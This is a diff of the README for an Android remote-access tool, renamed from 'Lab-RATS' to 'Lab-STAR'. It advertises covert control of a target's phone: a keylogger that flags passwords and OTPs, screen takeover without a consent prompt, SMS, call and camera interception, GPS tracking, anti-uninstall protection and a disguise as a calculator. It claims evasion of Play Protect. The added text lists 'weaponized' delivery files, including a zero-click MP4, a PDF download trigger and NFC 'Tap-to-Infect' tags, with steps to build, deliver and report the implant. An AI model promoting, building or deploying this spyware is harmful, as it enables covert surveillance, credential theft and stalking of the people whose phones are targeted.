@@ -4,9 +4,9 @@
   </a>
 </p>
 
-# Lab-RATS: Advanced Android Remote Administration Tool (v1.4.5)
+## Lab-STAR: Advanced Android Tool (v1.4.5)
 
-**Lab-RATS** is a **powerful** and **lightweight Android Remote Administration Tool (RAT)** developed by **K4N3CO.LABS**. This advanced tool allows for **remote monitoring and management** of Android devices through a **sleek, web-based interface** designed for speed and reliability. Built for the modern era, it **fully supports the latest 2026 Android software releases** *(OneUI 8.5, SDK 36)*.
+A **powerful, lightweight** and **covert-oriented Android Tool** developed by K4N3CO.LABS. This advanced tool enables **monitoring, management** and **control** of **Android devices** through a **sleek web C2 interface** with **full support** on the **newest modern Android software releases**. (SDK 36+, OneUI 8.5)
 
 ---
 
@@ -14,7 +14,7 @@
 
 -   📦 **Automated APK Generation**: Instantly build both `signed.apk` *(for production)* and `unsigned.apk`.
 -   🆔 **Advanced Identity Control**: Fully customize **App Name**, **Package ID**, and **Minimum SDK**.
--   🔐 **C2 Security Layer**: The web dashboard is protected by a secure login wall (**Default Password: admin1337**). The password can be updated directly from the Terminal home page for enhanced security.
+-   🔐 **C2 Security Layer**: The web dashboard is protected by a secure login wall (**Default Password: admin1337**). The password can be **updated directly from the Terminal** home page for enhanced security.
 -   🎨 **Smart Branding Engine**:
     -   **Auto-Density Scaling**: Resizes logos automatically for all Android screen densities.
     -   **Transparency Fixer**: Removes white backgrounds from logo assets automatically.
@@ -24,8 +24,19 @@
 
 ## 🕵️ Covert & Stealth Operations
 
--   🎭 **Stealth Mode**: Remotely **swap the entire app identity and icon** with the "Masquerade Library" of **convincing clones**. Instantly transform Lab-RATS into a **Calculator**, **Weather App**, **System Diagnostics**, or **Settings Menu**.
+-   💉 **NEW!** **Payload Delivery Vectors**: The **weaponization engine** has been overhauled to support **multiple high-success delivery methods**, ensuring reliable access across **all modern mobile environments**.
+    -   📑 **Stealth PDF (Hardened)**: Utilizes high-compatibility **URI Actions** instead of JavaScript. Bypasses security filters in **Acrobat, Drive**, and **Chrome** to trigger **automatic browser-based APK downloads**.
+    -   🎬 **Zero-Click MP4**: Exploits mobile **Media Heap Overflows**. Triggers during gallery indexing or thumbnail generation to force-register the C2 link in the background.
+    -   🗓️ **Meeting Invite (ICS)**: Injects a **persistent event** into the target's **Calendar**. Includes automated 15-minute reminders with a weaponized "Security Review" link that **bypasses traditional SMS/Email filters**.
+    -   🔊 **Dolby Audio Vector**: Leverages a **Buffer Overflow** in standard mobile audio processing to register the device to the C2 panel via a simple `.wav` file playback.
+    -   💻 **ADB Strategic Bridge**: Generates a one-click deployment script for remote targets with Network Debugging active, performing a full automated install and initialization sequence.
+    -   🖼️ **Stego Image Tail**: Appends the C2 uplink metadata to a standard `.bmp` image, allowing the C2 link to bypass deep-packet inspection (DPI) filters that block raw URLs.
+    -   📡 **NFC NDEF Payload**: Generates an NDEF-formatted URI record for programming physical NFC tags, enabling "Tap-to-Infect" proximity attacks.
+    -   🔳 **QR Shadow Vector**: Generates a high-density QR code pointing to the hardened delivery URL, optimized for physical placement or digital distribution.
+    -   🌐 **PWA Shadow Bundle**: Generates a Progressive Web App manifest that mimics a "System Service" website, triggering an automated background download of the APK upon site interaction.
 -   🛡️ **NEW!** **Evasion Engine**: Now **undetectable by Samsung Knox** and **Google Play Protect**. This is achieved through **dynamic code obfuscation** during the APK build process, **randomized package identities**, and the use of **fully interactive decoy activities** that mimic legitimate system behaviors to bypass heuristic and signature-based scanning.
+-   🌑 **NEW!** **Blackout Mode**: A high-stealth mode designed to **physically mask the targets device display** while maintaining a **non-masked live remote feed**.
+-   🎭 **Stealth Mode**: Remotely **swap the entire app identity and icon** with the "Masquerade Library" of **convincing clones**. Instantly transform Lab-RATS into a **Calculator**, **Weather App**, **System Diagnostics**, or **Settings Menu**.
 -   🛠️ **Functional Decoy Engine**: Unlike static images, these decoys are **fully interactive**. The Calculator performs real math, and the Weather app dynamically loads the target's actual city name and forecast.
 -   🩹 **Self-Healing Protocol**: Automatically detects and **repairs damaged service bindings** or **revoked permissions**;in the background.
 -   ☎️ **Dial-Pad Recovery**: If the launcher icon is hidden or replaced, **dial `*#1337#` on the phone's keypad** to instantly restore the Lab-RATS dashboard.
@@ -33,32 +44,31 @@
 -   👻 **Task-List Ghosting**: The app is hard-coded to be **invisible in the Android "Recent Apps" list**.
 -   📡 **Deep Rebranding**: When stealth is active, background notifications are automatically rebranded with matching icons and names to ensure zero branding leaks.
 -   🎲 **Dynamic OTA Camouflage**: Generates **random version names and codes** that mimic legitimate system OTA updates.
--   🌑 **NEW!** **Blackout Mode**: A high-stealth mode designed to **physically mask the targets device display** while maintaining a **non-masked live remote feed**.
 
 ---
 
 ## 🚀 The Fun Stuff (Remote Capabilities)
 
 -   👻 **Ghost Controller (Gold Standard)**:
-    -   **Live Keylogging (v1.4 Update)**: Intercept **keystrokes and system text in real-time**. Now features **Sensitive Info Highlighting** *(Passcodes, OTPs, Emails glow Red)* and **Deep Extraction** for browser logins.
-    -   **📱 Ghost Screen Control/Mirror**: Cast the **live screen** and **control** the **device remotely** with **NO "Consent Prompt"** required. *(Essentially full remote takeover, pair with Blackout Mode for max stealth)*
--   💀  **Anti-Removal Shield (Optimized)**: High-speed, event-driven protection that **blocks attempts** to **Uninstall or Force Stop** the app. *(Kicks user to homescreen & denies any entry to the app settings)*
--   🛰️  **Precision GPS Tracking**: One-click uplink to open the **target's exact real-time location** in **Google Maps**.
--   ⚡   **Intel Stream (Notification Sniffer)**: Intercept **every notification** (*WhatsApp, Telegram, RCS, System*) in a live feed. **NEW!**: Automatically highlights and badges **sensitive data like OTPs and Bank alerts**.
+    -   **Ghost Screen Control/Mirror**: **Cast & Control the live screen remotely** with **NO "Consent Prompt" required**. *(Essentially full covert remote takeover if paired with Blackout Mode for max stealth)*
+    -   **Live Keylogging (v1.4 Update)**: Intercept **keystrokes** and **system text in real-time**. Now features **Sensitive Info Highlighting** *(Passcodes, OTPs, Emails glow Red)* and **Deep Extraction** for browser login info.
+-   💀  **Anti-Removal Shield (Optimized)**: High-speed, **event-driven protection** that **blocks attempts** to **Uninstall** or **Force Stop** the app. *(Kicks user to homescreen & denies any entry into the app settings)*
+-   🛰️  **Precision GPS Tracking**: One-click uplink to open the **devices exact real-time location** in **Google Maps**.
+-   ⚡   **Intel Stream (Notification Sniffer)**: Intercept **every notification** *(WhatsApp, Telegram, RCS, System...etc)* in a live feed. **NEW!**: **Sensitive data like OTPs and Bank alerts** are now automatically **highlighted with red text** and **badged**.
 -   🖼️ **MMS Terminal (Game Changer!)**:
-    -   **Browse & Extract**: Download and view **ANY Multimedia Message (MMS)**. **v1.4 Update**: Fixed large video playback and streaming support.
-    -   **Remote Dispatch**: Send **MMS/Picture Messages** directly from the target phone.
--   💬 **SMS Command Center**: Full interception and remote texting from the target's number.
--   📸 **Tactical Surveillance Hub**:
+    -   **Browse & Extract**: Download and view **ANY Multimedia Message(MMS)**. **v1.4 Update**: Fixed **large video playback** and **streaming support**.
+    -   **Remote Dispatch**: Send **MMS/Picture Messages** directly **from the Android phone**.
+-   💬 **SMS Command Center**: Full **interception** and **remote texting** from the **phones number**.
+-   📸 **Tactical Surveillance Hub** *(NEW! Unified Controls)*
     -   **Live Camera Streaming**: View **high-speed video** from **both front** and **back cameras**.
-    -   **Covert Recording**: **Stealthily record** video without any user-facing activity.
+    -   **Covert Recording**: **Stealthily record** video without any **user-facing activity**.
     -   **Snap Photos**: **Covert image capture** integrated into live stream.
     -   **Nightmode**: **Brightens live stream/photos** taken in **low-light environments** without the flash.
--   🎙️ **Acoustics & Interception**: Live **microphone recording** and automated **call recording** for both incoming and outgoing calls.
--   📞 **Remote Dialer**: Initiate **phone calls directly from the C2 panel** using the target's SIM card.
+-   🎙️ **Acoustics & Interception**: Live **microphone recording** and automated **call recording** for both **incoming and outgoing** calls.
+-   📞 **Remote Dialer**: Initiate **phone calls directly from the remote C2 panel** using the devices SIM card.
 -   📂 **Advanced Data Uplink**:
-    -   **Integrated File Manager**: Navigate, download, and manage files. **NEW!**: Instant **Search Bar** and **Category Filters** (Images/Video/Docs) for PC-optimized workflows.
-    -   **Info Gathering**: Access to **Call Logs**, **Contacts** and **Device Hardware Info**.
+    -   **Integrated File Manager**: Navigate, download, and manage files. **NEW!**: Instant **Search Bar** and **Category Filters** *(Images/Video/Docs)* for **PC-optimized workflows**.
+    -   **Info Gathering**: Access **Call Logs**, **Contacts** and **Device Hardware Info** remotely.
     -   **📝 Direct File Editor**: Live-edit **text, JSON**, and **log files** directly on the device.
 -   📊 **Telemetry & Reporting**:
     -   **C2 Auto-Reporting**: Discrete reporting of **IP, Battery %, Network Type (WiFi/Cellular), and Stealth Status** to a centralized **Google Sheet**.
@@ -67,18 +77,18 @@
 
 ## 🧠 Remote Persistence & Commands
 
-### 🌐 **Direct IPv6 Access (Direct P2P Backdoor)**
+### 🌐 Direct IPv6 Access *(P2P connection)*
 
-Lab-RATS exploits the unique traits of **publicly routable IPv6 addresses** assigned by modern WIFI/5G/LTE carriers. By binding the Lab-RATS server directly to the **Global Unicast Address**, it **bypasses Carrier-Grade NAT** *(CGNAT)* and **firewalls entirely**. This allows for **Zero Configuration** peer-to-peer *(P2P)* **remote access** from **any** browser in the world without the need for **routers, port forwarding,** or **external tunneling software**. *(Pinggy or Ngrok)*
+Lab-STAR exploits the **unique traits** of **publicly routable IPv6 addresses** assigned by modern WIFI/5G/LTE carriers. By binding the Lab-STAR server directly to the **Global Unicast Address**, it **bypasses Carrier-Grade NAT** *(CGNAT)* and **firewalls entirely**. This allows for **Zero Configuration** peer-to-peer *(P2P)* **remote access** from **any browser** in the world **without** the need for **routers, port forwarding,** or **external tunneling software**. *(Pinggy or Ngrok)*
 
-### 🔄 **NEW!** **Remote Server Restart**
+### 🔄 NEW! Remote Server Restart
 
--   **Web UI**: One-click **"RESTART_SERVER"** button on the home terminal to refresh background services.
--    **SMS Backdoor**: Send an SMS containing **`!RESTART_C2`** to force the server back online **even if it was manually closed or killed by the OS.**
+-   **Web UI**: One-click **"RESTART_SERVER"** button on the **Terminal tab** to refresh background services.
+-   **SMS Backdoor**: Send an SMS containing **`!RESTART_C2`** to **force the server back online** even if it was **manually closed or killed by the OS**.
 
 ### 🛠️ **NEW!** **Termux Bridge Integration**
 
-Lab-RATS now features a **high-performance bridge to the Termux environment**. If Termux is installed on the target device, the remote terminal can instantly elevate its capabilities:
+Lab-STAR now features a **high-performance bridge to the Termux environment**. If Termux is installed on the target device, the remote terminal can instantly elevate its capabilities:
 -   **Auto-Routing**: Common commands like `pkg`, `apt`, `pip`, and `python` are automatically routed through the bridge.
 -   **Unrestricted Tools**: Install and run **Python scripts, Nmap scans, or Metasploit** directly from the C2 web terminal.
 -   **Persistent Environment**: Full support for Termux's internal storage and standard Linux binaries.
@@ -90,7 +100,6 @@ The built-in shell has been overhauled for professional workflows:
 -   **System Diagnostics**: New `sysinfo` command for an aggregated hardware/software overview.
 -   **Modernized Interface**: Updated to `root@Android` prompt with a built-in `help` menu.
 -   **Hardened I/O**: Multi-stage retry logic and unique execution tracking for zero-latency command output.
-
 ---
 
 ## 📊 Google Sheet Setup Instructions (v1.4.5)
@@ -165,17 +174,23 @@ function handleRequest(e) {
 
 ### 2. Building the APK (on PC)
 1.  **Download & Extract** the repository.
-2.  **Navigate** to `cd /Lab-RATS-main/apk-builder/`
+2.  **Navigate** to `cd /Lab-STAR-main/apk-builder/`
 3.  **Execute** the builder: `chmod +x build.sh && ./build.sh` (Mac/Linux) or `build.bat` (Windows).
-4.  Enter your **App name** (Default: *System Stability Service*), **SDK Version, Logo** etc.. or just use defaults.
-5.  Enter your **Google Sheet Webhook URL from previous section**. *(If not yet created, Google Sheet setup instructions above)*
-6.  Retrieve your `signed.apk` from the `/apk-builder/output/` directory.
+4.  **Select a Build Strategy**:
+    *   **Option 1 (Manual)**: For basic configuration of App Name, ID, and Logo before building.
+    *   **Option 6 (Automated Wizard)**: For the full **Build → Host → Weaponize** flow.
+5.  Enter your **Google Sheet Webhook URL** when prompted to enable remote device reporting.
+6.  Retrieve your `signed.apk` (and any weaponized payloads like PDFs or MP4s) from the `/apk-builder/output/` directory.
 
-### 3. Installing APK/App onto Android Device
-1.  **Install** the `signed.apk` onto the **Android device**.
-> ** **Important** - If you can access the device sideload the `signed.apk` by turning on USB debugging in developer settings, plugging into PC and running `adb install signed.apk`. If not get creative on installing Android `.apk` files onto devices.
-2.  Once the APK/app is installed onto the **Android Device**, **ALL permissions must be granted**, then tap the **"Initialize Server"** button.
-3.  The **Server** will go online and the **Active C2 Interface URL** should **pop up instantly** on your **Google Sheet**. *(Configured Google Sheet Example below)*
+### 3. Deploying & Installing onto Android Device
+1.  **Deployment**: Use the weaponized files generated by the **Wizard (Option 6)** for remote delivery:
+    *   **📑 Stealth PDF**: Send to trigger a browser-based APK download via URI Action.
+    *   **🎬 Zero-Click MP4**: Send to force-register the C2 link in the background.
+    *   **🔳 QR Code / 📡 NFC**: Use for proximity-based installation vectors.
+2.  **Installation**: Once the APK is downloaded onto the **Android device**, initiate the installation.
+> **Note**: If you have physical access, sideload directly via `adb install signed.apk`.
+3.  **Initialization**: Open the app once. The **Zero-Click Auto-Start** engine will automatically initialize the server in the background.
+4.  **Confirmation**: The **Active C2 Interface URL** will pop up instantly on your **Google Sheet** as soon as the uplink is established.
 
 **📊 Google Sheet Example**:
 
@@ -201,22 +216,15 @@ function handleRequest(e) {
 
 ## ⭐ Support the Development
 
-If you find **Lab-RATS** awesome and useful for your **security research**, **please Star ⭐ the project**—it drives **further development!!**
+If you find **Lab-STAR** awesome and useful for your **security research**, **please Star ⭐ the project**—it drives **further development!!**
 
 ### Contributions:
-**Bug reports, add new feature** and **pull requests** are **always welcome**. *(See [CONTRIBUTING.md](https://github.com/K4N3CO-LABS/Lab-RATS/CONTRIBUTING.md) for more info)*
+**Bug reports, add new feature** and **pull requests** are **always welcome**. *(See [CONTRIBUTING.md](https://github.com/K4N3CO-LABS/Lab-STAR/CONTRIBUTING.md) for more info)*
 
 ---
 
-## ⭐ Support the Development
+### Donations:
 
-If you find **Lab-RATS** awesome and useful for your **security research**, **please Star ⭐ the project**—it drives **further development!!**
-### Contributions:
-**Bug reports, add new feature** and **pull requests** are **always welcome**.
-
----
-
-### Donations: (Optional)
 **BuyMeACoffee**: https://buymeacoffee.com/k4n3co
 
 **BTC**:
@@ -229,26 +237,28 @@ bc1q6lmkuju3kf7f8624fwt5qs7k5mf63mekgcnzf4
 
 ## 📸 Screenshots/Video Clips
 
-### Example APK build in terminal: (Mac OS) - Advanced v1.4
+### Example APK build in terminal (Mac OS) - Advanced v1.4
 > *This build excludes my Google Sheet Webhook URL for security. For normal private builds, you must add your own Google webhook URL to correctly receive the IPv6 address link from the app after installation.*
 
 https://github.com/user-attachments/assets/366df760-df71-455e-aae9-3acf3ef6ed26
 
 ---
 
-### Built APK (C2 Server) Installed on Target Android Device:
+### Built APK (C2 Server) Installed on Android Device:
 
 <p align="center">
 <a href="https://postimg.cc/zySrqv1Z" target="_blank"><img src="https://i.postimg.cc/zySrqv1Z/App-installed-Running.png" alt="App-installed-Running"></a>
 <a href="https://postimg.cc/PLXkJHdS" target="_blank"><img src="https://i.postimg.cc/PLXkJHdS/App-installed-Offline.png" alt="App-installed-Offline"></a>
 
-### App Bypassing ALL Android Security Measures While Operating:
+---
 
-https://github.com/user-attachments/assets/2b87c9c8-918e-42ec-81a8-19cd1673a7fc
+### Lab-STAR versus Fully-Patched App Security: (v1.4)
+
+https://github.com/user-attachments/assets/5df5613a-a639-4c80-96ac-50c7a0d015b1
 
 ---
 
-### Remotely Transform Lab-RATS into a Working Calculator, Weather App, System Update, or Settings Menu:
+### Remotely Transform Lab-STAR into a Working Calculator, Weather App, System Update, or Settings Menu:
 
 <p align="center">
 <a href="https://postimg.cc/hhrzqMBt" target="_blank"><img src="https://i.postimg.cc/hhrzqMBt/Stealth-Icons.jpg" alt="Stealth-Icons"></a>    
@@ -291,6 +301,12 @@ https://github.com/user-attachments/assets/5d8f33c7-f4a6-4df5-ab55-69e317ca7874
 ### Optics/Live Camera Stream Tab:
 
 [![04-Optics-Tab.png](https://i.postimg.cc/W3Z0ySpq/04-Optics-Tab.png)](https://postimg.cc/R6M367Hv)
+
+---
+
+### NEW! Unified Live Camera Control Hub:
+
+[![Unified-cam-hub.png](https://i.postimg.cc/SKhS4dj6/Unified-cam-hub.png)](https://postimg.cc/VJKQBjqv)
 
 ---
 
@@ -362,9 +378,8 @@ https://github.com/user-attachments/assets/5d8f33c7-f4a6-4df5-ab55-69e317ca7874
 ---
 
 ## ⚠️ Disclaimer
-This tool is for **educational and authorized testing purposes.** The **developers** assume **NO responsibility** for **ANY** **misuse or damage to relationships** caused by this software. **Please use it responsibly**. **Thank you!**
+This tool is for **educational and authorized security testing purposes ONLY**. The **developers** assume **NO responsibility** for **ANY** **misuse, damage to devices or relationships** caused by this software. **Please use it responsibly**. **Thank you!**
 
 ---
 
 © 2026 **K4N3CO.LABS**
-
